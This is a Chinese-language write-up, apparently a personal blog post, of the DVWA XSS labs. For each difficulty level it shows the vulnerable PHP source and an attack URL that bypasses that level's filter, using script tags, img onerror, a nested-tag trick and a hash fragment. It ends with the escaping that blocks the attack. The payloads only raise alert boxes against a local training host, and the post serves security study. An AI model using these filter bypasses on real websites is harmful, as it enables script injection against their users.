---

title: DVWA XSS
date: 2020-12-22 10:01:48
categories: dvwa
tags: 
- xss
---

## XSS (DOM)

### low 级别

**source**

```php
<?php

# No protections, anything goes

?>
```

```
http://192.168.3.38/vulnerabilities/xss_d/?default=English<script>alert('xss')</script>
```

<!-- more -->

![xss-dom-low](https://cdn.jsdelivr.net/gh/yzbtdiy/images@main/security/dvwa/xss-dom-low.jpg)

### medium 级别

过滤掉了 script 标签, 但可以使用 img 标签

**source**

```php
<?php

// Is there any input?
if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {
    $default = $_GET['default'];
    
    # Do not allow script tags
    if (stripos ($default, "<script") !== false) {
        header ("location: ?default=English");
        exit;
    }
}

?>
```

```
http://192.168.3.38/vulnerabilities/xss_d/?default=English</select><img src=1 onerror=alert('xss')>
```

![xss-dom-medium](https://cdn.jsdelivr.net/gh/yzbtdiy/images@main/security/dvwa/xss-dom-medium.jpg)

### high 级别

设置了白名单, 只允许使用特定关键字, 但使用 `#` 之后的内容被识别为注释, 仍然可以执行

**source**

```php
<?php

// Is there any input?
if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {

    # White list the allowable languages
    switch ($_GET['default']) {
        case "French":
        case "English":
        case "German":
        case "Spanish":
            # ok
            break;
        default:
            header ("location: ?default=English");
            exit;
    }
}

?>
```

```
http://192.168.3.38/vulnerabilities/xss_d/?default=German#<script>alert('xss')</script>
```

![xss-dom-high](https://cdn.jsdelivr.net/gh/yzbtdiy/images@main/security/dvwa/xss-dom-high.jpg)

### impossible 级别

开启了客户端保护

```php
<?php

# Don't need to do anything, protction handled on the client side

?>
```

## XSS (Reflected)

### low 级别

**source**

```php
<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Feedback for end user
    echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';
}

?>
```

```
http://192.168.3.38/vulnerabilities/xss_r/?name=<script>alert('xss')</script>#
```

### medium 级别

**source**

```php
<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Get input
    $name = str_replace( '<script>', '', $_GET[ 'name' ] );

    // Feedback for end user
    echo "<pre>Hello ${name}</pre>";
}

?>
```

将 `<script>` 替换为空, 可以使用 `<scr<script>ipt>` 绕过

```
http://192.168.3.38/vulnerabilities/xss_r/?name=<scr<script>ipt>alert('xss')</script>#
```

### high 级别

**source**

```php
<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Get input
    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );

    // Feedback for end user
    echo "<pre>Hello ${name}</pre>";
}

?>
```

过滤掉了 `<script` 关键字, 但 <img> 标签仍然可用

```
http://192.168.3.38/vulnerabilities/xss_r/?name=<img src=1 onerror=alert('xss')>#
```

### impossible 级别

**source**

```php
<?php

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Get input
    $name = htmlspecialchars( $_GET[ 'name' ] );

    // Feedback for end user
    echo "<pre>Hello ${name}</pre>";
}

// Generate Anti-CSRF token
generateSessionToken();

?>
```

使用 [`htmlspecialchars`](https://www.php.net/htmlspecialchars) 对特殊字符转义, 无法使用 html 标签

